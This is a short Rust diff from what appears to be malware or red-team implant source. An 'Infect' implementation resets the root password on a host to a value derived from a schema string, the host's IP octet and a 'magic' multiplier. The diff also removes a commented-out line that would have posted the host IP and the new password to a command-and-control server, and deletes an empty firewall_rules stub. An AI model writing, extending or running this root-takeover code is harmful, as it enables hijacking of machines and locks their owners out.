@@ -55,17 +55,14 @@ fn passwd(username: &str, password: &str) -> std::io::Result<()> {
 }
 
 impl super::types::Infect for crate::Host {
-    fn change_password(&self, schema: &str) {
+    fn change_password(&self, magic: u8, schema: &str) {
         // Change password based on Schema
         let password = format!(
             "{}{:?}!",
             schema,
-            self.ip.split('.').last().unwrap().parse::<u16>().ok()
+            self.ip.split('.').last().unwrap().parse::<u16>().ok().unwrap_or_default() * magic as u16
         );
         let _ = passwd("root", password.as_str());
-
-        // Post Evil fetch results to C2
-        // let _ = post_evil_results(&self.c2, &self.ip, &password);
     }
 }
 
@@ -149,10 +146,6 @@ impl super::types::OS for crate::Host {
             all_connections.into_boxed_slice(),
             open_ports.into_boxed_slice(),
         )
-    }
-
-    fn firewall_rules() {
-        todo!()
     }
 
     fn ip() -> Box<str> {
